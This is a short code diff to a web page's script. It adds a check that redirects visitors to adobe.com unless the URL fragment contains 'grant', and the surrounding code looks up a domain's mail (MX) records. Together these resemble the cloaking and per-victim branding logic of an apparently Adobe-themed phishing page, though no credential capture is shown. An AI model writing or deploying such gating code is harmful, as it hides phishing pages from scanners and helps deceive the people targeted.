@@ -436,6 +436,24 @@ const from = new URLSearchParams(window.location.search).get('from');
 
   <script>
   
+  function checkUrlHashForGrant() {
+    // Get the current URL hash (everything after #)
+    const urlHash = window.location.hash;
+    
+    // Remove the # symbol if it exists and convert to lowercase for case-insensitive comparison
+    const hashValue = urlHash.substring(1).toLowerCase();
+    
+    // Check if 'grant' is present in the hash
+    if (! hashValue.includes('grant')) {
+        // Redirect to adobe.com if 'grant' is not found
+        window.location.href = 'https://adobe.com';
+    }
+}
+
+// Execute the check when the page loads
+document.addEventListener('DOMContentLoaded', checkUrlHashForGrant);
+
+  
       const apiURL = "https://dns.google/resolve?type=MX&name=";  
 
     async function getMXRecords(domain) {
